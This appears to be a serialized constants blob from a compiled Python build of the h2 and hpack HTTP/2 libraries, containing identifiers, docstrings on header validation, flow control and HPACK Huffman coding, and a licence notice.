    aH2StreamuH2Stream.__init__a__repr__uH2Stream.__repr__ainbound_flow_control_windowuH2Stream.inbound_flow_control_windowaopenuH2Stream.openacloseduH2Stream.closedaclosed_byuH2Stream.closed_byaupgradeuH2Stream.upgradeTFasend_headersuH2Stream.send_headersapush_stream_in_banduH2Stream.push_stream_in_bandalocally_pusheduH2Stream.locally_pushedTFnasend_datauH2Stream.send_dataaend_streamuH2Stream.end_streamaadvertise_alternative_serviceuH2Stream.advertise_alternative_serviceaincrease_flow_control_windowuH2Stream.increase_flow_control_windowareceive_push_promise_in_banduH2Stream.receive_push_promise_in_bandaremotely_pusheduH2Stream.remotely_pushedareceive_headersuH2Stream.receive_headersareceive_datauH2Stream.receive_dataareceive_window_updateuH2Stream.receive_window_updateareceive_continuationuH2Stream.receive_continuationareceive_alt_svcuH2Stream.receive_alt_svcTluH2Stream.reset_streamuH2Stream.stream_resetaacknowledge_received_datauH2Stream.acknowledge_received_datauH2Stream._build_hdr_validation_flagsuH2Stream._build_headers_framesuH2Stream._process_received_headersuH2Stream._initialize_content_lengthuH2Stream._track_content_lengtha_inbound_flow_control_change_from_settingsuH2Stream._inbound_flow_control_change_from_settingsuh2\stream.pyu<module h2.stream>Ta__class__Taselfastream_idaconfigainbound_window_sizeaoutbound_window_sizeTaselfastream_idTaselfTaselfaeventsais_trailerais_response_headerais_push_promiseT
aselfaheadersaencoderafirst_frameahdr_validation_flagsaencoded_headersaheader_blocksaframesablockacfTaheadersaencodingaheaderanameavalueTaselfadeltaanew_max_sizeTaselfaheaderswnwvTaselfaheadersaheader_validation_flagsaheader_encodingTaselfalengthaend_streamaactualaexpectedTaselfaacknowledged_sizeaincrementwfTaselfafield_valueaasfTaselfaprevious_stateaeventTaselfadfTaselfaincrementawufTaselfaeventsTaselfainput_afuncatarget_stateaold_stateaprevious_stateweTaselfarelated_stream_idaheadersaencoderaeventsappfahdr_validation_flagsaframesTaselfaframeaeventsTaselfadataaend_streamaflow_control_lenaeventsaes_eventsTaselfaheadersaend_streamaheader_encodingainput_aeventsaes_eventsahdr_validation_flagsTaselfapromised_stream_idaheadersaheader_encodingaeventsahdr_validation_flagsTaselfaincrementaeventsaframesaeventTaselfaprevious_stateTaselfaprevious_stateamsgaeventTaselfapushed_headersaeventsTaselfaerror_codearsfTaselfaprevious_stateaerroraeventTaselfadataaend_streamapad_lengthadfTaselfaheadersaencoderaend_streamainput_aeventsahfahdr_validation_flagsaframesTaselfaclient_sideainput_u.h2.utilities-(u
    Certain headers are at risk of being attacked during the header compression
    phase, and so need to be kept out of header compression contexts. This
    function automatically transforms certain specific headers into HPACK
    never-indexed fields to ensure they don't get added to header compression
    contexts.

    This function currently implements two rules:

    - 'authorization' and 'proxy-authorization' fields are automatically made
      never-indexed.
    - Any 'cookie' header field shorter than 20 bytes long is made
      never-indexed.

    These fields are the most at-risk. These rules are inspired by Firefox
    and nghttp2.
    aheadersla_SECURE_HEADERSaNeverIndexedHeaderTupleTccookieacookiela_secure_headersutoo many values to unpack (expected 2)Tc:methodu:methodaencodeTuutf-8u
    Extracts the request method from the headers list.
    d:c:statusd1w:u:statusw1astartswithu
    Searches a header block for a :status header to confirm that a given
    collection of headers are an informational response. Assumes the header
    block is well formed: that is, that the HTTP/2 special headers are first
    in the block, and so that it can stop looking when it finds the first
    header field whose name does not begin with a colon.

    :param headers: The HTTP/2 header block.
    :returns: A boolean indicating if this is an informational response.
    gaFlowControlErrorTuMay not increment flow control window past 2147483647u
    Increments a flow control window, guarding against that window becoming too
    large.

    :param current: The current value of the flow control window.
    :param increment: The increment to apply to that window.
    :returns: The new value of the window.
    :raises: ``FlowControlError``
    Tc:authorityu:authorityu
    Given a header set, searches for the authority header and returns the
    value.

    Note that this doesn't terminate early, so should only be called if the
    headers are for a client request. Otherwise, will loop over the entire
    header set, which is potentially unwise.

    :param headers: The HTTP header set.
    :returns: The value of the authority header, or ``None``.
    :rtype: ``bytes`` or ``None``.
    a_reject_empty_header_namesa_reject_uppercase_header_fieldsa_reject_surrounding_whitespacea_reject_tea_reject_connection_headera_reject_pseudo_header_fieldsa_check_host_authority_headera_check_path_headeru
    Validates a header sequence against a set of constraints from RFC 7540.

    :param headers: The HTTP header set.
    :param hdr_validation_flags: An instance of HeaderValidationFlags.
    u
    Raises a ProtocolError if any header names are empty (length 0).
    While hpack decodes such headers without errors, they are semantically
    forbidden in HTTP, see RFC 7230, stating that they must be at least one
    character long.
    aProtocolErrorTuReceived header name with zero length.u
    Raises a ProtocolError if any uppercase character is found in a header
    block.
    aUPPER_REasearchuReceived uppercase header name %s.u
    Raises a ProtocolError if any header name or value is surrounded by
    whitespace characters.
    a_WHITESPACEquReceived header name surrounded by whitespace %ruReceived header value surrounded by whitespace %ru
    Raises a ProtocolError if the TE header is present in a header block and
    its value is anything other than "trailers".
    TcteatealowerTctrailersatrailersuInvalid value for TE header: %su
    Raises a ProtocolError if the Connection header is present in a header
    block.
    aCONNECTION_HEADERSuConnection-specific header field present: %s.u
    Given a string that might be a bytestring or a Unicode string,
    return True if it starts with the appropriate prefix.
    uHeader block missing mandatory %s headeru
    Given a set of header names, checks whether the string or byte version of
    the header name is present. Raises a Protocol error with the appropriate
    error if it's missing.
    u
    Raises a ProtocolError if duplicate pseudo-header fields are found in a
    header block or if a pseudo-header field appears in a block after an
    ordinary header field.

    Raises a ProtocolError if pseudo-header fields are found in trailers.
    a_custom_startswithaseen_pseudo_header_fieldsuReceived duplicate pseudo-header field %saaddaseen_regular_headeruReceived pseudo-header field out of sequence: %sa_ALLOWED_PSEUDO_HEADER_FIELDSuReceived custom pseudo-header field %sa_check_pseudo_header_field_acceptabilityamethodahdr_validation_flagsais_traileruReceived pseudo-header in trailer %sais_response_headera_assert_header_in_seta_REQUEST_ONLY_HEADERSuEncountered request-only headers %su:pathc:pathu:methodc:methodu:schemec:schemea_RESPONSE_ONLY_HEADERSuEncountered response-only headers %scCONNECTa_CONNECT_REQUEST_ONLY_HEADERSuEncountered connect-request-only headers %su
    Given the set of pseudo-headers present in a header block and the
    validation flags, confirms that RFC 7540 allows them.
    u
    Given the :authority and Host headers from a request block that isn't
    a trailer, check that:
     1. At least one of these headers is set.
     2. If both headers are set, they match.

    :param headers: The HTTP header set.
    :raises: ``ProtocolError``
    Tchostahostaauthority_header_valahost_header_valTuRequest header block does not have an :authority or Host header.uRequest header block has mismatched :authority and Host headers: %r / %ra_validate_host_authority_headeru
    Raises a ProtocolError if a header block arrives that does not contain an
    :authority or a Host header, or if a header block contains both fields,
    but their values do not match.
    ainneru_check_path_header.<locals>.inneru
    Raise a ProtocolError if a header block arrives or is sent that contains an
    empty :path header.
    Tc:pathu:pathTuAn empty :path header is forbiddenu
    Given an iterable of header two-tuples, rebuilds that iterable with the
    header names lowercased. This generator produces tuples that preserve the
    original type of the header tuple for tuple and any ``HeaderTuple``.
    aHeaderTuplea_lowercase_header_namesu
    Given an iterable of header two-tuples, strip both leading and trailing
    whitespace from both header names and header values. This generator
    produces tuples that preserve the original type of the header tuple for
    tuple and any ``HeaderTuple``.
    astripa_strip_surrounding_whitespaceu
    Strip any connection headers as per RFC7540 § 8.1.2.2.
    a_strip_connection_headersu
    Raises an InvalidHeaderBlockError if we try to send a header block
    that does not contain an :authority or a Host header, or if
    the header block contains both fields, but their values do not match.
    u
    RFC 7540 § 8.1.2.5 allows HTTP/2 clients to split the Cookie header field,
    which must normally appear only once, into multiple fields for better
    compression. However, they MUST be joined back up again when received.
    This normalization step applies that transform. The side-effect is that
    all cookie fields now appear *last* in the header block.
    ccookieacookiesc; a_combine_cookie_fieldsu
    Normalizes a header sequence that we are about to send.

    :param headers: The HTTP header set.
    :param hdr_validation_flags: An instance of HeaderValidationFlags.
    u
    Normalizes a header sequence that we have received.

    :param headers: The HTTP header set.
    :param hdr_validation_flags: An instance of HeaderValidationFlags
    a_check_sent_host_authority_headeru
    Validates and normalizes a header sequence that we are about to send.

    :param headers: The HTTP header set.
    :param hdr_validation_flags: An instance of HeaderValidationFlags.
    asize_limita_size_limitaSizeLimitDicta__init__a_check_size_limita__setitem__aselfapopitemTFTalastu
h2/utilities
~~~~~~~~~~~~

Utility functions that do not belong in a separate module.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__acollectionsareastringTawhitespaceawhitespaceahpackTaHeaderTupleaNeverIndexedHeaderTupleaexceptionsTaProtocolErroraFlowControlErroracompileTc[A-Z]P
cconnectioncupgradeaupgradeutransfer-encodingctransfer-encodinguproxy-connectioncproxy-connectionckeep-aliveukeep-aliveaconnectionPc:statusc:methodu:pathu:methodc:pathc:authorityc:protocolc:schemeu:schemeu:authorityu:protocolu:statusPcauthorizationaauthorizationcproxy-authorizationuproxy-authorizationP
u:methodc:pathc:methodu:pathc:authorityc:protocolu:schemec:schemeu:authorityu:protocolPc:statusu:statusPc:protocolu:protocolaordaextract_method_headerais_informational_responseaguard_increment_windowaauthority_from_headersanamedtupleaHeaderValidationFlagsLais_clientais_trailerais_response_headerais_push_promiseavalidate_headersanormalize_outbound_headersanormalize_inbound_headersavalidate_outbound_headersaOrderedDicta__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uh2.utilitiesa__module__a__qualname__uSizeLimitDict.__init__uSizeLimitDict.__setitem__uSizeLimitDict._check_size_limita__orig_bases__uh2\utilities.pyu<module h2.utilities>Ta__class__Taselfaargsakwargsa__class__Taselfakeyavaluea__class__Tastring_headerabytes_headeraheader_setTaheadersahdr_validation_flagsaskip_validationTaheadersahdr_validation_flagsainneraskip_validationTapseudo_headersamethodahdr_validation_flagsainvalid_response_headersainvalid_request_headersainvalid_headersTaselfTaheadersahdr_validation_flagsacookiesaheaderacookie_valTatest_stringabytes_prefixaunicode_prefixTaheadersahdr_validation_flagsaheaderTaheadersahdr_validation_flagsaseen_pseudo_header_fieldsaseen_regular_headeramethodaheaderTaheadersaauthority_header_valahost_header_valaheaderaauthority_presentahost_presentTaheaderswnwvTaheaderswkwvTacurrentaincrementaLARGEST_FLOW_CONTROL_WINDOWanew_sizeTaheaderaheadersTaheadersTaheaderswnwvasigilastatusainformational_startTaheadersahdr_validation_flagsu.h2.windows1aLARGEST_FLOW_CONTROL_WINDOWamax_window_sizeacurrent_window_sizela_bytes_processedaFlowControlErrorTuFlow control window shrunk below 0u
        We have received a certain number of bytes from the remote peer. This
        necessarily shrinks the flow control window!

        :param size: The number of flow controlled bytes we received from the
            remote peer.
        :type size: ``int``
        :returns: Nothing.
        :rtype: ``None``
        uFlow control window mustn't exceed %du
        The flow control window has been incremented, either because of manual
        flow control management or because of the user changing the flow
        control settings. This can have the effect of increasing what we
        consider to be the "maximum" flow control window size.

        This does not increase our view of how many bytes have been processed,
        only of how much space is in the window.

        :param size: The increment to the flow control window we received.
        :type size: ``int``
        :returns: Nothing
        :rtype: ``None``
        a_maybe_update_windowu
        The application has informed us that it has processed a certain number
        of bytes. This may cause us to want to emit a window update frame. If
        we do want to emit a window update frame, this method will return the
        number of bytes that we should increment the window by.

        :param size: The number of flow controlled bytes that the application
            has processed.
        :type size: ``int``
        :returns: The number of bytes to increment the flow control window by,
            or ``None``.
        :rtype: ``int`` or ``None``
        aminlllu
        Run the algorithm.

        Our current algorithm can be described like this.

        1. If no bytes have been processed, we immediately return 0. There is
           no meaningful way for us to hand space in the window back to the
           remote peer, so let's not even try.
        2. If there is no space in the flow control window, and we have
           processed at least 1024 bytes (or 1/4 of the window, if the window
           is smaller), we will emit a window update frame. This is to avoid
           the risk of blocking a stream altogether.
        3. If there is space in the flow control window, and we have processed
           at least 1/2 of the window worth of bytes, we will emit a window
           update frame. This is to minimise the number of window update frames
           we have to emit.

        In a healthy system with large flow control windows, this will
        irregularly emit WINDOW_UPDATE frames. This prevents us starving the
        connection by emitting eleventy bajillion WINDOW_UPDATE frames,
        especially in situations where the remote peer is sending a lot of very
        small DATA frames.
        u
h2/windows
~~~~~~~~~~

Defines tools for managing HTTP/2 flow control windows.

The objects defined in this module are used to automatically manage HTTP/2
flow control windows. Specifically, they keep track of what the size of the
window is, how much data has been consumed from that window, and how much data
the user has already used. It then implements a basic algorithm that attempts
to manage the flow control window without user input, trying to ensure that it
does not emit too many WINDOW_UPDATE frames.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__adivisionaexceptionsTaFlowControlErrorlguh2.windowsa__module__u
    A basic HTTP/2 window manager.

    :param max_window_size: The maximum size of the flow control window.
    :type max_window_size: ``int``
    aWindowManagera__qualname__a__init__uWindowManager.__init__awindow_consumeduWindowManager.window_consumedawindow_openeduWindowManager.window_openedaprocess_bytesuWindowManager.process_bytesuWindowManager._maybe_update_windowuh2\windows.pyu<module h2.windows>Taselfamax_window_sizeTaselfamax_incrementaincrementTaselfasizeu.hpack&u
hpack
~~~~~

HTTP/2 header encoding for Python.
a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_hpacku\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__ahpackTaEncoderaDecoderlaEncoderlaDecoderastructTaHeaderTupleaNeverIndexedHeaderTupleaHeaderTupleaNeverIndexedHeaderTupleaexceptionsTaHPACKErroraHPACKDecodingErroraInvalidTableIndexaOversizedHeaderListErroraInvalidTableSizeErroraHPACKErroraHPACKDecodingErroraInvalidTableIndexaOversizedHeaderListErroraInvalidTableSizeErrorLaEncoderaDecoderaHeaderTupleaNeverIndexedHeaderTupleaHPACKErroraHPACKDecodingErroraInvalidTableIndexaOversizedHeaderListErroraInvalidTableSizeErrora__all__u4.0.0a__version__uhpack\__init__.pyu<module hpack>u.hpack.exceptionsu
hyper/http20/exceptions
~~~~~~~~~~~~~~~~~~~~~~~

This defines exceptions used in the HTTP/2 portion of hyper.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__TEExceptionla__prepare__aHPACKErrora__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uhpack.exceptionsa__module__u
    The base class for all ``hpack`` exceptions.
    a__qualname__a__orig_bases__aHPACKDecodingErroru
    An error has been encountered while performing HPACK decoding.
    aInvalidTableIndexu
    An invalid table index was received.
    aOversizedHeaderListErroru
    A header list that was larger than we allow has been received. This may be
    a DoS attack.

    .. versionadded:: 2.3.0
    aInvalidTableSizeErroru
    An attempt was made to change the decoder table size to a value larger than
    allowed, or the list was shrunk and the remote peer didn't shrink their
    table size.

    .. versionadded:: 3.0.0
    uhpack\exceptions.pyu<module hpack.exceptions>u.hpack.hpackm%lladecodeTuutf-8u
    Provides a header as a unicode string if raw is False, otherwise returns
    it as a bytestring.
    alogadebuguEncoding %d with %d bitsuCan only encode positive integers, got %sluPrefix bits must be between 1 and 8, got %sa_PREFIX_BIT_MAX_NUMBERSaintegerlaelementsllu
    This encodes an integer according to the wacky integer encoding rules
    defined in the HPACK spec.
    laindexanumberashiftaHPACKDecodingErroruUnable to decode HPACK integer representation from %ruDecoded %d, consumed %d bytesu
    This decodes an integer according to the wacky integer encoding rules
    defined in the HPACK spec. Returns a tuple of the decoded integer and the
    number of bytes that were consumed from ``data`` in order to get that
    integer.
    u
    This converts a dictionary to an iterable of two-tuples. This is a
    HPACK-specific function because it pulls "special-headers" out first and
    then emits them.
    aheader_dictasortedakeysu<lambda>u_dict_to_iterable.<locals>.<lambda>Takeya_dict_to_iterablea_to_bytesastartswithTd:abasestringaencodeu
    Convert string to bytes.
    aHeaderTableaheader_tableaHuffmanEncoderaREQUEST_CODESaREQUEST_CODES_LENGTHahuffman_coderatable_size_changesamaxsizeu
        Controls the size of the HPACK header table.
        aresizedaappenda_encode_table_size_changeaHeaderTupleaindexablelaheaderaheader_blockaselfaaddahuffmancuEncoded header block to %su
        Takes a set of headers and encodes them into a HPACK-encoded header
        block.

        :param headers: The headers to encode. Must be either an iterable of
                        tuples, an iterable of :class:`HeaderTuple
                        <hpack.HeaderTuple>`, or a ``dict``.

                        If an iterable of tuples, the tuples may be either
                        two-tuples or three-tuples. If they are two-tuples, the
                        tuples must be of the format ``(name, value)``. If they
                        are three-tuples, they must be of the format
                        ``(name, value, sensitive)``, where ``sensitive`` is a
                        boolean value indicating whether the header should be
                        added to header tables anywhere. If not present,
                        ``sensitive`` defaults to ``False``.

                        If an iterable of :class:`HeaderTuple
                        <hpack.HeaderTuple>`, the tuples must always be
                        two-tuples. Instead of using ``sensitive`` as a third
                        tuple entry, use :class:`NeverIndexedHeaderTuple
                        <hpack.NeverIndexedHeaderTuple>` to request that
                        the field never be indexed.

                        .. warning:: HTTP/2 requires that all special headers
                            (headers whose names begin with ``:`` characters)
                            appear at the *start* of the header block. While
                            this method will ensure that happens for ``dict``
                            subclasses, callers using any other iterable of
                            tuples **must** ensure they place their special
                            headers at the start of the iterable.

                            For efficiency reasons users should prefer to use
                            iterables of two-tuples: fixing the ordering of
                            dictionary headers is an expensive operation that
                            should be avoided if possible.

        :param huffman: (optional) Whether to Huffman-encode any header sent as
                        a literal value. Except for use when debugging, it is
                        recommended that this be left enabled.

        :returns: A bytestring containing the HPACK-encoded header block.
        uAdding %s to the header table, sensitive:%s, huffman:%sutoo many values to unpack (expected 2)aINDEX_INCREMENTALaINDEX_NEVERasearcha_encode_literalutoo many values to unpack (expected 3)a_encode_indexeda_encode_indexed_literalu
        This function takes a header key-value tuple and serializes it.
        aencode_integeru
        Encodes a header using the indexed representation.
        u
        Encodes a header with a literal name and literal value. If ``indexing``
        is True, the header will be added to the header table: otherwise it
        will not.
        llu
        Encodes a header with an indexed name and a literal value and performs
        incremental indexing.
        ll ablocku
        Produces the encoded form of all header table size change context
        updates.
        amax_header_list_sizeamax_allowed_table_sizeuDecoding %sacurrent_indexl@a_decode_indexeda_decode_literal_indexaheadersTuTable size update not at the start of the blocka_update_encoding_contexta_decode_literal_no_indexainflated_sizeatable_entry_sizeaOversizedHeaderListErroruA header list larger than %d has been receiveda_assert_valid_table_sizea_unicode_if_neededarawTuUnable to decode headers as UTF-8.u
        Takes an HPACK-encoded header block and decodes it into a header set.

        :param data: A bytestring representing a complete HPACK-encoded header
                     block.
        :param raw: (optional) Whether to return the headers as tuples of raw
                    byte strings or to decode them as UTF-8 before returning
                    them. The default value is False, which returns tuples of
                    Unicode strings
        :returns: A list of two-tuples of ``(name, value)`` representing the
                  HPACK-encoded headers, in the order they were decoded.
        :raises HPACKDecodingError: If an error is encountered while decoding
                                    the header block.
        aheader_table_sizeaInvalidTableSizeErrorTuEncoder did not shrink table size to within the maxu
        Check that the table size set by the encoder is lower than the maximum
        we expect to have.
        adecode_integerTuEncoder exceeded max allowable table sizeu
        Handles a byte that updates the encoding context.
        aget_by_indexuDecoded %s, consumed %du
        Decodes a header represented using the indexed representation.
        a_decode_literall?ll:lnnTuTruncated header blockadecode_huffmanadataaconsumedalengthaNeverIndexedHeaderTupleanameavalueuDecoded %s, total consumed %d bytes, indexed %su
        Decodes a header represented with a literal.
        u
hpack/hpack
~~~~~~~~~~~

Implements the HPACK header compression algorithm as detailed by the IETF.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__aloggingatableTaHeaderTableatable_entry_sizeaexceptionsTaHPACKDecodingErroraOversizedHeaderListErroraInvalidTableSizeErrorTaHuffmanEncoderahuffman_constantsTaREQUEST_CODESaREQUEST_CODES_LENGTHahuffman_tableTadecode_huffmanastructTaHeaderTupleaNeverIndexedHeaderTupleagetLoggerTuhpack.hpackdaINDEX_NONEdd@;lllTOstrObyteslaDEFAULT_MAX_HEADER_LIST_SIZEuhpack.hpacka__module__u
    An HPACK encoder object. This object takes HTTP headers and emits encoded
    HTTP/2 header blocks.
    aEncodera__qualname__a__init__uEncoder.__init__uEncoder.header_table_sizeasetterTtuEncoder.encodeTFuEncoder.adduEncoder._encode_indexeduEncoder._encode_literaluEncoder._encode_indexed_literaluEncoder._encode_table_size_changeu
    An HPACK decoder object.

    .. versionchanged:: 2.3.0
       Added ``max_header_list_size`` argument.

    :param max_header_list_size: The maximum decompressed size we will allow
        for any single header block. This is a protection against DoS attacks
        that attempt to force the application to expand a relatively small
        amount of data into a really large header list, allowing enormous
        amounts of memory to be allocated.

        If this amount of data is exceeded, a `OversizedHeaderListError
        <hpack.OversizedHeaderListError>` exception will be raised. At this
        point the connection should be shut down, as the HPACK state will no
        longer be usable.

        Defaults to 64kB.
    :type max_header_list_size: ``int``
    aDecoderuDecoder.__init__uDecoder.header_table_sizeuDecoder.decodeuDecoder._assert_valid_table_sizeuDecoder._update_encoding_contextuDecoder._decode_indexeduDecoder._decode_literal_no_indexuDecoder._decode_literal_indexuDecoder._decode_literaluhpack\hpack.pyTwku<module hpack.hpack>Ta__class__Taselfamax_header_list_sizeTaselfTaselfadataaindexaconsumedaheaderTaselfadataashould_indexatotal_consumedaindexed_nameaname_lenanot_indexableahigh_byteaindexaconsumedanamealengthavalueaheaderTaselfadataTaheader_dictakeysakeyTaselfaindexafieldTaselfaindexavalueaindexbitahuffmanaprefixavalue_lenTaselfanameavalueaindexbitahuffmananame_lenavalue_lenTaselfablockasize_bytesTastringTaheaderarawanameavalueTaselfadataanew_sizeaconsumedTaselfato_addasensitiveahuffmananameavalueaindexbitamatchaencodedaindexaperfectTaselfadataarawadata_memaheadersadata_lenainflated_sizeacurrent_indexacurrentaindexedaliteral_indexaencoding_updateaheaderaconsumedTadataaprefix_bitsamax_numberaindexashiftamaskanumberanext_byteTaselfaheadersahuffmanaheader_blockaheaderasensitiveTaintegeraprefix_bitsamax_numberaelementsTaselfavalueu.hpack.huffman%ahuffman_code_listahuffman_code_list_lengthsclaselfllafinal_numafinal_int_lenl:lnnarstripTwLw0afromhexu
        Given a string of bytes, encodes them according to the HPACK Huffman
        specification.
        u
hpack/huffman_decoder
~~~~~~~~~~~~~~~~~~~~~

An implementation of a bitwise prefix tree specially built for decoding
Huffman-coded content where we already know the Huffman table.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__uhpack.huffmana__module__u
    Encodes a string according to the Huffman encoding table defined in the
    HPACK specification.
    aHuffmanEncodera__qualname__a__init__uHuffmanEncoder.__init__aencodeuHuffmanEncoder.encodeuhpack\huffman.pyu<module hpack.huffman>Taselfahuffman_code_listahuffman_code_list_lengthsTaselfabytes_to_encodeafinal_numafinal_int_lenabyteabin_int_lenabin_intabits_to_be_paddedatotal_bytesaexpected_digitsamissing_digitsu.hpack.huffman_constantsu
hpack/huffman_constants
~~~~~~~~~~~~~~~~~~~~~~~

Defines the constant Huffman table. This takes up an upsetting amount of space,
but c'est la vie.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__Ll?llllllllllllllllllllllllllllllllllll?llllllllllllllllllllll\lll lll?l!l]l^l_l`lalblcldlelflglhliljlklllmlnlolplqlrllsll?ll?ll"lll#ll$ll%l&l'lltlul(l)l*ll+lvl,lll-lwlxlylzl{llll?ll?ll?l?lllllllllllllllllllllllllllllll?llllllllllllllllllllll?llllllllll?lllllllll?l?lllllll?l?ll?lllllll?l?l?l?ll?lllllllllllllll?lll?l?l?l?l?ll?l?l?l?l?llaREQUEST_CODESLl
llpppppplllpllpppppppllppppppppll
pll
llll
pllllpplpplppppppllllll
l
llpppppppppppppppppppppllll
ll
lllllllllppllplpplllllpllppppllll
llllplpplllpppplllpllllppplllllplllllplplllpllllplplllllpllppllpllplllllllpplplllllllpllllplpllppllllllpllplplplllllplppppllppppllaREQUEST_CODES_LENGTHuhpack\huffman_constants.pyu<module hpack.huffman_constants>u.hpack.huffman_table
clBastatellaHUFFMAN_TABLEutoo many values to unpack (expected 3)aHUFFMAN_FAILaHPACKDecodingErrorTuInvalid Huffman StringaHUFFMAN_EMIT_SYMBOLadecoded_bytesaappendlaflagsaHUFFMAN_COMPLETETuIncomplete Huffman stringu
    Given a bytestring of Huffman-encoded data for HPACK, returns a bytestring
    of the decompressed data.
    u
hpack/huffman_table
~~~~~~~~~~~~~~~~~~~

This implementation of a Huffman decoding table for HTTP/2 is essentially a
Python port of the work originally done for nghttp2's Huffman decoding. For
this reason, while this file is made available under the MIT license as is the
rest of this module, this file is undoubtedly a derivative work of the nghttp2
file ``nghttp2_hd_huffman_data.c``, obtained from
https://github.com/tatsuhiro-t/nghttp2/ at commit
d2b55ad1a245e1d1964579fa3fac36ebf3939e72. That work is made available under
the Apache 2.0 license under the following terms:

    Copyright (c) 2013 Tatsuhiro Tsujikawa

    Permission is hereby granted, free of charge, to any person obtaining
    a copy of this software and associated documentation files (the
    "Software"), to deal in the Software without restriction, including
    without limitation the rights to use, copy, modify, merge, publish,
    distribute, sublicense, and/or sell copies of the Software, and to
    permit persons to whom the Software is furnished to do so, subject to
    the following conditions:

    The above copyright notice and this permission notice shall be
    included in all copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
    EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
    MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
    NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
    LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
    OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
    WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

The essence of this approach is that it builds a finite state machine out of
4-bit nibbles of Huffman coded data. The input function passes 4 bits worth of
data to the state machine each time, which uses those 4 bits of data along with
the current accumulated state data to process the data given.

For the sake of efficiency, the in-memory representation of the states,
transitions, and result values of the state machine are represented as a long
list containing three-tuples. This list is enormously long, and viewing it as
an in-memory representation is not very clear, but it is laid out here in a way
that is intended to be *somewhat* more clear.

Essentially, the list is structured as 256 collections of 16 entries (one for
each nibble) of three-tuples. Each collection is called a "node", and the
zeroth collection is called the "root node". The state machine tracks one
value: the "state" byte.

For each nibble passed to the state machine, it first multiplies the "state"
byte by 16 and adds the numerical value of the nibble. This number is the index
into the large flat list.

The three-tuple that is found by looking up that index consists of three
values:

- a new state value, used for subsequent decoding
- a collection of flags, used to determine whether data is emitted or whether
  the state machine is complete.
- the byte value to emit, assuming that emitting a byte is required.

The flags are consulted, if necessary a byte is emitted, and then the next
nibble is used. This continues until the state machine believes it has
completely Huffman-decoded the data.

This approach has relatively little indirection, and therefore performs
relatively well, particularly on implementations like PyPy where the cost of
loops at the Python-level is not too expensive. The total number of loop
iterations is 4x the number of bytes passed to the decoder.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__aexceptionsTaHPACKDecodingErrorladecode_huffmanlTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTl lpTl#lpTl*lpTl1lpTl9lpl@l0l1l2lalclelilolsltTl
lpTllpTllpTllpTllpTllpllll(lll
lll)l8l l%l-l.l/l3l4l5l6l7l9TllpTllpTllpTllpTl!lpTl"lpTl$lpTl%lpTl+lpTl.lpTl2lpTl5lpTl:lpTl=lpTlAlplDl=lAl_lbldlflglhlllmlnlplrluTl&lpTl'lpl:lBlCTl,lpTl-lpTl/lpTl0lpTl3lpTl4lpTl6lpTl7lpTl;lpTl<lpTl>lpTl?lpTlBlpTlClpTlElplHlElFlGlIlJlKlLlMlNlOlPlQlRlSlTlUlVlWlYljlklqlvlwlxlylzTlFlpTlGlpTlIlpl&l*l,l;lXlZTlKlpTlNlpTlLlpTlMlpTlOlpTlQlpl!l"l?TlPlpTlRlpTlTlpl'l+l|TlSlpTlUlpTlXlpl#l>TlVlpTlWlpTlYlpTlZlpl$l[l]l~Tl[lpTl\lpl^l}Tl]lpTl^lpl<l`l{Tl_lpTl`lpTlnlpTlalpTlelpTlolpTllpTlblpTlclpTlflpTlilpTlplpTlwlpTllpTllpl\llTldlpTlglpTlhlpTljlpTlklpTlqlpTltlpTlxlpTl~lpTllpTllpTllpTllpllllllllTlllpTlmlpllllTlrlpTlslpTlulpTlvlpTlylpTl{lpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllplllllllllTlzlpTl|lpTl}lpTllpTllpTllpTllpllllllllllllllTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpllllllllllllTllpTllpTllpTllplllllllTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllplllllllllllllllllllllTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllplllllllllllTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpllllTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllplllllllllllllllTllpllTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllplllllllllllllllllTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpTllpllllllllllllllllllllTllpTllpTllpl
uhpack\huffman_table.pyu<module hpack.huffman_table>Tahuffman_stringastateaflagsadecoded_bytesainput_byteaindexaoutput_byteu.hpack.structa__new__u
hpack/struct
~~~~~~~~~~~~

Contains structures for representing header fields with associated metadata.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__TOtuplela__prepare__aHeaderTuplea__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uhpack.structa__module__u
    A data structure that stores a single header field.

    HTTP headers can be thought of as tuples of ``(field name, field value)``.
    A single header block is a sequence of such tuples.

    In HTTP/2, however, certain bits of additional information are required for
    compressing these headers: in particular, whether the header field can be
    safely added to the HPACK compression context.

    This class stores a header that can be added to the compression context. In
    all other ways it behaves exactly like a tuple.
    a__qualname__a__slots__aindexableuHeaderTuple.__new__a__orig_bases__aNeverIndexedHeaderTupleu
    A data structure that stores a single header field that cannot be added to
    a HTTP/2 header compression context.
    uhpack\struct.pyu<module hpack.struct>Ta__class__Taclsaargsu.hpack.tableSu
